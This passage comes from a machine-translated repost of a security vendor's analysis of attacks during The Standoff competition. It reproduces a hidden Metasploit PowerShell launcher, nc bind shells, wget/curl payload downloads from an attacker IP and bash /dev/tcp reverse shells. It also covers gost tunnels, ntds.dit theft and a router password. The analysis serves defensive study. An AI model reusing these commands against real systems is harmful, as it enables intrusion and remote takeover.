class="hljs-variable">$env:windir</span></span>+<span class="hljs-string"><span class="hljs-string">'\sysnative\WindowsPowerShell\v1.0\powershell.exe'</span></span>}<span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{<span class="hljs-variable"><span class="hljs-variable">$b</span></span>=<span class="hljs-string"><span class="hljs-string">'powershell.exe'</span></span>};<span class="hljs-variable"><span class="hljs-variable">$s</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">New-Object</span></span> System.Diagnostics.ProcessStartInfo;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.FileName=<span class="hljs-variable"><span class="hljs-variable">$b</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.Arguments=<span class="hljs-string"><span class="hljs-string">'-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream([Convert]::FromBase64String('</span></span><span class="hljs-string"><span class="hljs-string">'H4sIAGRK+1...u9uxfACgAA'</span></span><span class="hljs-string"><span class="hljs-string">')))[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.UseShellExecute=<span class="hljs-variable"><span class="hljs-variable">$false</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.RedirectStandardOutput=<span class="hljs-variable"><span class="hljs-variable">$true</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.WindowStyle=<span class="hljs-string"><span class="hljs-string">'Hidden'</span></span>;<span class="hljs-variable"><span class="hljs-variable">$s</span></span>.CreateNoWindow=<span class="hljs-variable"><span class="hljs-variable">$true</span></span>;<span class="hljs-variable"><span class="hljs-variable">$p</span></span>=[<span class="hljs-type"><span class="hljs-type">System.Diagnostics.Process</span></span>]::Start(<span class="hljs-variable"><span class="hljs-variable">$s</span></span>);<span class="hljs-string"><span class="hljs-string">""</span></span></code> </pre> <br><br>  Este script fue generado por el marco Metasploit.  Su prop√≥sito es abrir el socket en el puerto 55443 para escuchar y ejecutar la "carga √∫til" que lleg√≥ a este puerto, presumiblemente Meterpreter. <br><br><img src="https://habrastorage.org/webt/wn/z6/ds/wnz6dsnq-y0_afhix3hwzux5myi.png"><br><br>  Un intento de lanzar un shell remoto fue exitoso.  Despu√©s de eso, los atacantes continuaron desarrollando el ataque y el nombre de usuario crea otra cuenta con el nombre "vitalik", agregando esta cuenta al grupo "Administradores de dominio" y poco despu√©s de su creaci√≥n, vemos un inicio de sesi√≥n interactivo. <br><br><img src="https://habrastorage.org/webt/3l/dx/iz/3ldxiz4on2lnwl2dfi0jbjaejpq.png"><br><img src="https://habrastorage.org/webt/ai/5p/ja/ai5pja6z1fj4desvnmnsr5mjkx4.png"><br><img src="https://habrastorage.org/webt/yl/nz/g1/ylnzg1plksc4kim1rscff0wfyz8.png"><br><img src="https://habrastorage.org/webt/ul/n3/q0/uln3q0refn34ohp5vgvy71a_dpi.png"><br><br>  Si bien vitalik cre√≥ el servicio con el mismo script de PowerShell que el nombre de usuario, el nombre de usuario restableci√≥ masivamente las contrase√±as de las cuentas de dominio y se interes√≥ en el vecino servidor de correo de dominio Win2008R2-EXCH. <br><br>  La actividad casi simult√°nea de los usuarios de usuario y vitalik en el servidor de dominio de Exchange (escaneo e inicio de sesi√≥n) sugiere que probablemente varios miembros del equipo examinaron la red SPUTNIK al mismo tiempo. <br><br><img src="https://habrastorage.org/webt/o3/r1/vb/o3r1vbzjoszizwtyjj319jfowgo.png"><br><img src="https://habrastorage.org/webt/4j/ag/zf/4jagzfgcn94aiacgfrzwzvgvn4o.png"><br><img src="https://habrastorage.org/webt/9f/x3/_1/9fx3_1jvkl4uqssgz68wrf6ldbm.png"><br><br>  vitalik verifica la disponibilidad del servidor de correo y lanza la consola de administraci√≥n del servidor despu√©s de un inicio de sesi√≥n interactivo. <br><br><img src="https://habrastorage.org/webt/zm/li/2g/zmli2globqjnbfeliqdjxkyd2mm.png"><br><img src="https://habrastorage.org/webt/mm/je/go/mmjegoxoerj7gci7kw2lvhkz6gy.png"><br><br>  Al no encontrar nada que valga la pena, arrastra su instrumentaci√≥n y artiller√≠a pesada al host Win2008R2-DC: numerosos scripts de PowerShell y el marco BloodHound aparecen en el controlador de dominio, que es una herramienta popular para el reconocimiento en las redes de Active Directory.  Para acceder a la interfaz web de BloodHound, el participante tuvo que desactivar el modo protegido en IE, que tambi√©n fue detectado por el SIEM. <br><br><img src="https://habrastorage.org/webt/u3/ib/u0/u3ibu0j98wyjouwgd_tfuzugafq.png"><br><br>  La actividad de BloodHound en la red no pas√≥ por PT NAD.  Una de las caracter√≠sticas de la herramienta era escanear hosts en la red en busca de conexiones activas.  Tal tr√°fico al servicio SRVSVC es detectado por una de las firmas PT NAD e indica inteligencia dentro de la red: <br><br><img src="https://habrastorage.org/webt/zw/j7/9a/zwj79aykwoy3aa3ygbtlifaptzw.png"><br><br>  Aproximadamente a la una de la ma√±ana, los atacantes, despu√©s de haber creado previamente una copia instant√°nea del disco utilizando la utilidad vssadmin, arrastraron la base de datos ntds.dit que contiene todas las cuentas de dominio.  Despu√©s de completar con √©xito este ataque, los atacantes toman completamente el control del dominio, recibiendo el hash de la cuenta especial "krbtgt" a su disposici√≥n.  Ser propietario de esta cuenta le permite crear y usar el llamado.  Golden Ticket: ticket Kerberos para acceso ilimitado a los recursos en el dominio, acceso a servidores en nombre de cualquier usuario existente e incluso inexistente, y cualquier acci√≥n en el dominio.  Usar Golden Ticket es bastante dif√≠cil de detectar con equipos de protecci√≥n, pero comprometer los enlaces krbtgt y ntds.dit es mucho m√°s f√°cil de detectar. <br><br><img src="https://habrastorage.org/webt/is/xb/ko/isxbkotm_hpkchj8wfg6jmb9nqu.png"><br><img src="https://habrastorage.org/webt/oo/k7/69/ook7697a_0mftn0ynebutsrzwwa.png"><br><img src="https://habrastorage.org/webt/tp/dp/-v/tpdp-vl4mvsfelj_wlxzlnqo5ro.png"><br><br>  El equipo est√° pasando gradualmente de la investigaci√≥n de dominio a la investigaci√≥n de la red del sistema de control de procesos automatizado que ha abierto.  Tras arrastrar los esc√°neres Nmap a los empleados de SPUTNIK: YLAVRENTIEV.sputnik.phd y EPONOMAREV.sputnik.phd, las redes se escanearon 172.20.xx. Los participantes usaron <a href="">nmap_performance.reg</a> para cambiar los par√°metros TCP / IP de la pila de ventanas y acelerar el escaneo de la red de control de procesos. <br><br><img src="https://habrastorage.org/webt/oo/fm/7g/oofm7gzqfy5ze8f1oowfc3lxs-o.png"><br><img src="https://habrastorage.org/webt/2b/pf/pe/2bpfpextzlgkpkcimasndiajhg0.png"><br><br>  Las conexiones a los hosts en el sistema de control autom√°tico de procesos de la red a trav√©s de los t√∫neles en los hosts de dominio SPUTNIK hablan por s√≠ mismos.  Puede encontrar una descripci√≥n de lo que hicieron los piratas inform√°ticos en la red industrial en el video de nuestros colegas en <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">YouTube</a> . <br><br>  Entre los otros logros de los atacantes, se notaron otros t√∫neles, sesiones ssh, avances creativos despu√©s de una noche de insomnio el primer d√≠a de la competencia y, por supuesto, mineros de juegos establecidos que extrajeron la moneda DDOS Coin. <br><br><h2>  ZABBIX (100.64.100.161) </h2><br>  Ubicado en la oficina DMZ # 1 y con orgullo desempe√±√≥ su papel hasta aproximadamente el mediod√≠a, fue pirateado por un equipo no identificado. <br><br><img src="https://habrastorage.org/webt/4t/6o/6z/4t6o6zrdsxgxqtuvbwqmucyekjy.png"><br><br>  No fue dif√≠cil encontrar credenciales de administrador y el equipo utiliz√≥ la funcionalidad incorporada de zabbix para expandir ilimitadamente las capacidades de monitoreo utilizando scripts personalizados. <br><br><img src="https://habrastorage.org/webt/rb/_w/xo/rb_wxomfxjzu5-9lx7au5u3lll4.png"><br><br>  Puede usar cualquier comando de Linux en los scripts, que es lo que los equipos miembros usaron para crear shells y proxies Socks. <br><br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/ping -c 3 {HOST.CONN} 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /bin/ <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=/bin/nc -e /bin/sh -lp 5432 2&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping 8.8.8.8 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping 8.8.8.8; netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping -n 4 8.8.8.8; netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /tmp/phd <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=netstat -tulpn <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=wget http://195.16.61.232:8888/x86_elf -O /tmp; ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=curl http://195.16.61.232:8888/x86_elf --output /tmp/tmp.bin;ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ping -c 4 195.16.61.232 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=touch /tmp/<span class="hljs-built_in"><span class="hljs-built_in">test</span></span>;ls /tmp/ <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">pwd</span></span> <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=whoami <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=ls /var/www/html <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=<span class="hljs-built_in"><span class="hljs-built_in">which</span></span> nc <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=curl http://195.16.61.230/PHD/ --output /tmp/tmp.bin; ls /tmp <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/8080 0&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=chmod u+x /tmp/tmp.bin;/tmp/tmp.bin <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/195 &gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/1950 0&gt;&amp;1 <span class="hljs-built_in"><span class="hljs-built_in">command</span></span>=bash -i &gt;&amp; /dev/tcp/195.16.61.232/8080 0&gt;&amp;1</code> </pre> <br>  El equipo intent√≥ descargar el m√≥dulo del servidor bajo el control 195.16.61.232, pero fue en vano: <br><br><img src="https://habrastorage.org/webt/le/d6/t4/led6t46tphox4hnvieokwotovo4.png"><br><br>  Luego, despu√©s de un poco de exploraci√≥n del entorno, instal√© un shell bash remoto usando herramientas linux est√°ndar con el mismo servidor, enviando paquetes directamente a / dev / tcp /. <br><br>  No menos interesante fue el contenido del tr√°fico entre el equipo y los proyectiles, que se transmiti√≥ a la intemperie y no pas√≥ por los sensores PT NAD. <br><br><pre> <code class="bash hljs">bash-4.2$ /tmp/gost -L socks4a://:1080 &amp; bash-4.2$ gost -L=:54321 -F=10.100.50.48:3389 bash-4.2$ /tmp/gost -L socks4a://:1080 &amp; bash-4.2$ nmap bash: nmap: <span class="hljs-built_in"><span class="hljs-built_in">command</span></span> not found bash-4.2$ ifconfig bash-4.2$ ping 172.30.240.106 bash-4.2$ wget https://gist.githubusercontent.com/sh1n0b1/e2e1a5f63fbec3706123/raw/1bd5f119a7f1e2d4c9328d78686ae79b4e1642f7/linuxprivchecker.py bash-4.2$ python linuxprivchecker.py bash-4.2$ uname -a bash-4.2$ <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> /etc/cron.daily: bash-4.2$ ./gost -L=tcp://:33899/10.100.50.39:3389 bash-4.2$ ./gost -L=tcp://:4455/10.100.50.39:445 &amp; bash-4.2$ ./gost -L=tcp://:1139/10.100.50.39:139 &amp; bash-4.2$ ./gost -L=tcp://:12345/10.100.60.55:3389 &amp; bash-4.2$ ./gost -L=tcp://:12347/10.100.60.5:445 &amp; bash-4.2$ ./gost -L=tcp://:12348/10.100.60.15:445 &amp; bash-4.2$ ./gost -L=tcp://:12349/10.100.50.100:445 &amp; bash-4.2$ ./gost -L=tcp://:12350/10.100.80.28:445 &amp; bash-4.2$ ./gost -L=tcp://:12351/10.100.80.23:445 &amp; bash-4.2$ ./gost -L=tcp://:12352/10.100.80.30:445 &amp; bash-4.2$ ./gost -L=tcp://:12353/10.100.80.32:445 &amp; bash-4.2$ ./gost -L=tcp://:12354/10.100.80.26:445 &amp; bash-4.2$ ./gost -L=tcp://:12355/10.100.80.5:445 &amp; bash-4.2$ ./gost -L=tcp://:12356/10.100.80.9:445 &amp; bash-4.2$ ./gost -L=tcp://:12357/10.100.80.23:445 &amp; bash-4.2$ ./gost -L=socks5://:1081 &amp;</code> </pre><br>  Como podemos ver, el servidor ZABBIX se us√≥ principalmente como cabeza de puente para el reconocimiento de subredes de oficina # 1: 10.100.50.0/24 (Usuarios), 10.100.60.0/24 (Servidores) y 10.100.80.0/24 (SecurityTeam). <br><br><h2>  Multiservidor (100.64.100.167) </h2><br>  Multiserver es otro host de Linux en DMZ office # 1 con un par de servidores HTTP y una base de datos MySQL a bordo.  Aunque el multiservidor fue sometido a un escaneo intensivo, solo hubo unos pocos ataques exitosos.  El host conten√≠a la vulnerabilidad SambaCry 2017, encontrada despu√©s de las vulnerabilidades MS17-010, y los equipos intentaron usarla.  El filtro PT NAD le permite localizar sus intentos en la l√≠nea de tiempo: <br><br><img src="https://habrastorage.org/webt/ve/sl/eg/veslegx-lzcod0zrikbkknbtxbg.png"><br><br>  La carga en uno de los intentos de comando # 3 fue la biblioteca ejecutable DTECJtAf.so.  Y, a juzgar por el nombre de la biblioteca, los miembros del equipo utilizaron el m√≥dulo is_known_pipename del Metasploit Framework.  Prueba: <br><br><img src="https://habrastorage.org/webt/c1/5h/ar/c15harpx4hz5ocakhlp8gfq3-q4.png"><br><br>  Durante el enfrentamiento, los expertos fueron asistidos por PT MultiScanner, que verific√≥ todos los archivos que volaban por la red que fueron notados por PT NAD.  Despu√©s de un par de momentos, emite un veredicto a DTECJtAf.so volando sobre la red: Linux / SmbPayload.C <br><br><img src="https://habrastorage.org/webt/2w/xt/su/2wxtsub8m8u3kkr16dat4nrvk4m.png"><br><br>  A juzgar por la falta de m√°s interacciones de red entre el servidor y el comando # 3, el exploit no tuvo √©xito.  Sin embargo, casi al mismo tiempo, vemos una sesi√≥n SSH activa del equipo # 4.  Por el volumen de tr√°fico transmitido, podemos juzgar que los atacantes utilizaron el servidor al m√°ximo. <br><br><img src="https://habrastorage.org/webt/s4/bf/ns/s4bfnsifpckisravk3n-nrc-ena.png"><br><br>  En t√©rminos generales, el primer inicio de sesi√≥n SSH exitoso del usuario administrador del equipo # 4 ocurri√≥ alrededor de las 3:20 p.m. del primer d√≠a de la competencia: <br><br><img src="https://habrastorage.org/webt/a5/n-/hk/a5n-hkf4xvwasfati_pi-7x2boe.png"><br><br>  Como cualquier atacante decente, el inicio de sesi√≥n es seguido por la verificaci√≥n de privilegios y el reconocimiento en el host: <br><br><img src="https://habrastorage.org/webt/bp/zg/82/bpzg820wnmpyq6s4yrhslo27j4m.png"><br><img src="https://habrastorage.org/webt/hh/vx/7f/hhvx7ftfkizbqpwgdvfiontho-g.png"><br><img src="https://habrastorage.org/webt/37/or/nk/37ornkrlvhslrbgqiqrz2lrdyws.png"><br><img src="https://habrastorage.org/webt/jx/cz/fh/jxczfht677gxcxv8zavm-ngngu0.png"><br><img src="https://habrastorage.org/webt/vg/mo/ji/vgmoji-qysdos0gykutljqu-svc.png"><br><br>  Y m√°s all√°: <br><br><img src="https://habrastorage.org/webt/pn/em/dv/pnemdvcvvnsospf71fayabgznf0.png"><br><img src="https://habrastorage.org/webt/a0/ke/qk/a0keqkukwkssbwt3kjplim5muhg.png"><br><img src="https://habrastorage.org/webt/4s/pb/ga/4spbgaprasyzcv2sbu78xjjl3t8.png"><br><img src="https://habrastorage.org/webt/g2/yx/of/g2yxofrflehddk-g7pffs-fzlw4.png"><br><br>  Con facilidad, llevamos a cabo la atribuci√≥n del atacante por idioma: <br><br><img src="https://habrastorage.org/webt/zs/e6/xh/zse6xhfmkaibmxyptu4cdhabc6i.png"><br><br>  El multiservidor no recibi√≥ la configuraci√≥n adecuada y no se sabe con certeza qu√© otros intentos hicieron los equipos.  A juzgar por los registros disponibles, este host, as√≠ como otros hosts en la oficina DMZ # 1, sirvieron como punto de partida para explorar la infraestructura interna de la oficina. <br><br><h2>  Mis </h2><br>  Otros anfitriones tambi√©n se convirtieron en el foco de atenci√≥n de los equipos.  Por ejemplo, los participantes se comportaron con curiosidad en relaci√≥n con el enrutador Mikrotik al 100.64.100.237 en la red DMZ de Office # 1.  Aproximadamente a las 2 a.m. del segundo d√≠a de la confrontaci√≥n, hubo un inicio de sesi√≥n exitoso en la consola de la consola del enrutador Telnet con el par "admin: VxPvRxX74e8xrbia77hsi7WKm".  La versi√≥n de firmware del dispositivo era 6.38.4: esta es la versi√≥n en la que se prob√≥ el famoso exploit Chimay Red Stack Clash para Mikrotik, que permiti√≥ ejecutar cualquier c√≥digo en el dispositivo y, en particular, extraer las contrase√±as de los usuarios en el enrutador.  PT NAD ha descubierto una vulnerabilidad de explotaci√≥n. <br><br>  Pero luego, en el √°rea del almuerzo, el equipo que primero tom√≥ el enrutador decidi√≥ cerrar el agujero con una simple actualizaci√≥n de firmware y monopolizar el acceso: <br><br><img src="https://habrastorage.org/webt/p-/kj/-m/p-kj-mpfwkryznwmnwcvppojmk0.png"><br><br>  Este es uno de los pocos ejemplos en los que un equipo de participantes cierra un agujero en el sistema para que otros equipos no puedan capturar este host. <br><br>  PT MultiScanner ha detectado un curioso evento: <br><br><img src="https://habrastorage.org/webt/fn/vg/hm/fnvghm_xf8wqwb6y0ygw7obra_m.jpeg"><br><br>  Para acceder al banco, los equipos pueden usar el cliente del banco disponible en el sitio.  El sitio est√° ubicado en la red bancaria bajo la supervisi√≥n de un equipo de defensores y <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">construyeron el</a> cliente utilizando el marco Metasploit y lo reemplazaron con el original.  Afortunadamente para los defensores, el cliente incorporado fue descargado por varios equipos, como vemos en la captura de pantalla de PT MultiScanner arriba.  No se notaron conexiones exitosas, pero vale la pena mencionar el caso, porque tales escenarios tienen lugar en la vida cotidiana: los programas de troyanos atacantes en sitios oficiales o reemplazan actualizaciones para llevar a cabo ataques a clientes. <br><br><h2>  Mineros </h2><br>  Otra innovaci√≥n en The Standoff fue el advenimiento de los mineros de juegos.  Seg√∫n la leyenda, los equipos podr√≠an usar los servidores capturados como mineros, lo que les trajo puntos extra.  En lugar de las criptomonedas tradicionales, extrajeron DDoS Coin, el equivalente monetario del esfuerzo dedicado a un ataque DDoS en un servidor.  Los datos de los apretones de manos de TLS 1.2 sirvieron como prueba de trabajo y cuanto m√°s el minero hizo los apretones de manos de TLS con el servidor objetivo, mayor era su probabilidad de encontrar un nuevo bloque y recibir su recompensa del organizador del ataque DDoS. <br><br>  El cliente fue escrito en Go y pod√≠a funcionar tanto en Windows como en Linux.  La idea se aplic√≥ por primera vez y, aunque no todos los equipos lograron aplicarla, los intentos de lanzarla se vieron en muchos servidores de la infraestructura de juegos: <br><br><img src="https://habrastorage.org/webt/ea/sb/lf/easblf9r9rzmlqwyyxp56olu_r0.png"><br><br>  Intente ejecutar el minero en el nodo de Joomla (100.64.154.147) <br><br><img src="https://habrastorage.org/webt/_w/j0/um/_wj0umbbybcwaaw_t52vbpcl8v0.png"><br><br>  Ejecutando el minero desde la infraestructura SPUTNIK (10.106.60.0/24) <br><br><img src="https://habrastorage.org/webt/t-/9g/vd/t-9gvdd4vgnokiwbs1jwn5uheau.png"><br><br>  Como parte del juego, los equipos podr√≠an extraer criptomonedas e intercambiarlas por puntos de juego.  La mitad de los equipos lograron usar los servidores previamente capturados para extraer bloques.  Tambi√©n hubo un componente de intercambio en la l√≥gica del juego: con un cambio brusco en la cantidad de moneda extra√≠da, su tipo de cambio disminuy√≥.  Por lo tanto, fue posible realizar operaciones especulativas y ganar puntos sin completar tareas b√°sicas.  Pero dado que esta idea no se aplic√≥ previamente en tales juegos, los equipos no pudieron usarla adecuadamente y esto no afect√≥ significativamente el curso del juego. <br><br>  En t√©rminos de la cantidad de bloques minados, el equipo kazajo de CARKA tom√≥ la iniciativa, que fue el primero en lanzar mineros en la infraestructura de juegos.  Aqu√≠ pudimos pasar de los n√∫meros de red de los equipos a sus nombres debido al hecho de que sus identificadores inclu√≠an informaci√≥n sobre el bloque y se ten√≠an en cuenta al calcularlos.  En general, la idea result√≥ ser buena, y seguramente se puede ver en el pr√≥ximo The Standoff. <br><br><h2>  En lugar de salida </h2><br>  El √∫ltimo enfrentamiento estuvo activo: 12 equipos exploraron activamente y piratearon la infraestructura de la ciudad.  Nuestros productos nos permitieron "espiar" exactamente c√≥mo actuaron los participantes del juego, qu√© t√°cticas y herramientas eligieron y cu√°l se convirti√≥ en su objetivo.  Fuimos testigos de c√≥mo interactuaron con la infraestructura de dominio de la oficina, comenzando con la infecci√≥n de una m√°quina y terminando con la captura de todo el dominio y la transici√≥n a la siguiente red ACS.  Durante un evento como The Standoff, los productos tienen una gran carga: MaxPatrol SIEM manej√≥ 20,000 EPS, y PT NAD proces√≥ m√°s de 3 terabytes de tr√°fico de red en ambos d√≠as, sin mencionar la infraestructura de red en s√≠: enrutadores, conmutadores y firewalls. <br><br>  Tal compromiso de las oficinas virtuales podr√≠a ocurrir con las reales sin los medios adecuados de protecci√≥n y control.  Como regla, esto conduce a la filtraci√≥n de datos valiosos, como correspondencia, datos financieros y datos personales de empleados / usuarios. <br><br>  Entre los escaneos interminables, los brutos y los intentos de explotar todo tipo de vulnerabilidades, los productos ayudaron a determinar c√≥mo se piratearon los servidores de infraestructura del juego.  Se determinaron ataques exitosos y rastros de compromisos exitosos, tales como shells web, consolas remotas, t√∫neles e inicios de sesi√≥n de host.  Todo esto ayuda a los expertos a mejorar los productos. <br><br><img src="https://habrastorage.org/webt/aw/mk/24/awmk245o6p1ousad7r_aqj_kcni.png"><br><br>  En esta captura de pantalla de estad√≠sticas sobre las conexiones VPN de los equipos durante el juego, puedes ver cu√°n internacional fue The Standoff: ¬°se establecieron conexiones VPN con servidores en los Estados Unidos, Kazajst√°n, los Pa√≠ses Bajos y la mitad de Europa!  Por cierto, no hab√≠a equipos de Estados Unidos o Europa en The Standoff, pero hab√≠a un equipo de Kazajst√°n. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es418335/">https://habr.com/ru/post/es418335/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es418323/index.html">Un poco sobre los atributos de los hosts, el teclado, el c√≥digo y SCS en la serie "World of the Wild West" (Westworld)</a></li>
<li><a href="../es418327/index.html">Zapateros con botas: qu√© tel√©fonos inteligentes eligen los expertos por s√≠ mismos</a></li>
<li><a href="../es418329/index.html">Organizaci√≥n de pruebas seguras en producci√≥n. Parte 2</a></li>
<li><a href="../es418331/index.html">Maestros de servidores y redes: felices fiestas</a></li>
<li><a href="../es418333/index.html">Los robots Uber est√°n volviendo a la carretera, pero la gente los conducir√°</a></li>
<li><a href="../es418337/index.html">Hot, Summer DataGrip 2018.2</a></li>
<li><a href="../es418339/index.html">Manipulador "manual"</a></li>
<li><a href="../es418341/index.html">¬°Feliz d√≠a del administrador del sistema! Tarjeta de felicitaci√≥n con significado</a></li>
<li><a href="../es418345/index.html">Documentaci√≥n de formatos de intercambio de informaci√≥n: f√°cil y simple</a></li>
<li><a href="../es418347/index.html">¬øC√≥mo escrib√≠ la biblioteca est√°ndar de C ++ 11 o por qu√© boost es tan aterrador? Cap√≠tulo 4.3</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>